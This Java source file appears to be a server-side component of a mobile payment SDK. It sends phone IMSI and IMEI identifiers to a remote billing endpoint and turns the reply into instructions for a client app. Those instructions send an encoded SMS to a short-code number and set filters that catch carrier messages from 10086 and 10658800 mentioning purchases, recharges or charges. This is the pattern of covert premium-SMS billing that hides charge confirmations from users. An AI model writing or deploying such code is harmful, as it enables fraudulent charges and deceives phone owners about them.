package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class HhkjMm2DynamicService implements IDynamicService{

	private static final String TYPE = "hhkjMm2";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "imsi={imsi}&sid={sid}&paycode={paycode}&app_id={app_id}&channel_id={channel_id}&operation={operation}&imei={imei}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final String POSTFIX_CHANNELID = "0001";
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String sid = map.get("sid");
			
			if(sid == null || sid.length() == 0){
				sid = channel;
			}
			
			String paycode = map.get("paycode");
			String app_id = map.get("app_id");
			
			if(app_id.length() < 5){
				app_id = app_id + POSTFIX_CHANNELID;
			}
			
			String channel_id = map.get("channel_id");
			String operation = map.get("operation");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			
			String param = REQUESTMODEL.replace("{sid}",sid).replace("{paycode}",paycode).replace("{app_id}",app_id).replace("{channel_id}",channel_id).replace("{imei}",imei).replace("{imsi}",imsi);
			
			param = param.replace("{operation}", operation);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 10){
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status = jo.getString("result"); 
				
				if("0".equals(status)){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(CommonUtil.base64Decode(jo.getString("smsmsg")));
					sms.setSmsDest(jo.getString("smsport"));
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}else if("1".equals(status)){
					return "<wait>1</wait>";
				}
				
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		String url = "http://121.14.38.97:25324/argo_mtk/service";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "hhkjMm2");
		map.put("channel", "10B101a87654322");
		map.put("paycode", "30000887763110");
		map.put("app_id", "300008877631");
		map.put("channel_id", "3010233");
		map.put("operation", "102");
//		map.put("imsi","460026100246153");
//		map.put("imei","862594025131367");
		
		map.put("imei","869460011612203");
		map.put("imsi", "460028174282753");
		
		map.put("sid", "de68ad65a7dcf01d76926374aa95ac2c");
		
		System.out.println(new HhkjMm2DynamicService().dynamic(map));
		
		
	}

}
